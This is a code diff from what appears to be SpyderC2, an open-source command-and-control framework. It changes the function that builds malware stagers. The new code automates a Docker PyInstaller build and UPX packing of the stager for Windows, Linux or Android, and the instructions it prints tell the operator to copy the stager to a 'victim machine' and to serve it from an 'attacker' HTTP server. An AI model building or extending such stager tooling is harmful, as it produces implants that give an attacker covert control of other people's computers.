@@ -209,7 +209,7 @@ def runCmd(cmd,cwd=''):
 	try:
 		print(f"Running cmd - {cmd} in {cwd}\n")
 		if cwd == '':
-			process = Popen(cmd, stdout=PIPE, stderr=PIPE,shell=True)
+			process = Popen(cmd, shell=True)
 		else:
 			process = Popen(cmd, cwd=rf"{cwd}",shell=True)
 		stdout, stderr = process.communicate()
@@ -353,18 +353,32 @@ def generate_stager(server_logger,args={}):
 				print(colored(f"\nStager dumped to {colored(f'SpyderC2/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
 			print("\n")
+			docker_path = os.path.join(PATH,'shared','tmp')
 			if os_name == 'android':
-				generate_android_stager(os.path.join(PATH,'shared','tmp'))
+				generate_android_stager(docker_path)
 			else:
-				cmd = f'Please run the following command in path [orange_red1]SpyderC2/data/shared/tmp[/orange_red1] on the [bold blue]HOST MACHINE [/bold blue]\n\n'
+				if 'SPYDERC2_HOST_PATH' in os.environ and os.environ['SPYDERC2_HOST_PATH'] != '':
+					host_path = os.path.join(os.environ['SPYDERC2_HOST_PATH'],'data','shared','tmp')
+					if os_name == 'windows':
+						cmd = f'docker run -v "{host_path}:/src/" --entrypoint /bin/bash cdrx/pyinstaller-{os_name}:python3 -c "python -m pip install --upgrade pip  && /entrypoint.sh" && cd {docker_path} && ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}'
+					else:
+						cmd = f'docker run -v "{host_path}:/src/" cdrx/pyinstaller-{os_name} && cd {docker_path} && ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}'
 
-				if os_name == 'windows':
-					cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" --entrypoint /bin/bash cdrx/pyinstaller-{os_name}:python3 -c "python -m pip install --upgrade pip  && /entrypoint.sh" && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
+					res = runCmd(cmd)
+					pprint(f"[+] Stager generated at - [cyan]{host_path}/dist/{os_name} [/cyan] on host.")
+					return res
 				else:
-					cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
+					cmd = "Environment variable - SPYDERC2_HOST_PATH not found. Either pass SPYDERC2_HOST_PATH=/path/to/SpyderC2/on/host with docker-compose as mentioned in README or follow the following instructions to generate the stager manually.\n\n"
+					cmd += f'Please run the following command in path [orange_red1]SpyderC2/data/shared/tmp[/orange_red1] on the [bold blue]HOST MACHINE [/bold blue]\n\n'
 
-				cmd += f'The stager will be generated in [orange_red1]SpyderC2/data/shared/tmp/dist/{os_name}[/orange_red1] on HOST.\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager on victim.'
-				pprint(Panel(cmd, title="[red bold]ATTENTION!"))
+					if os_name == 'windows':
+						cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" --entrypoint /bin/bash cdrx/pyinstaller-{os_name}:python3 -c "python -m pip install --upgrade pip  && /entrypoint.sh" && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
+					else:
+						cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
+
+					cmd += f'The stager will be generated in [orange_red1]SpyderC2/data/shared/tmp/dist/{os_name}[/orange_red1] on HOST.\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager on victim.'
+					pprint(Panel(cmd, title="[red bold]ATTENTION!"))
+
 
 		return True
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
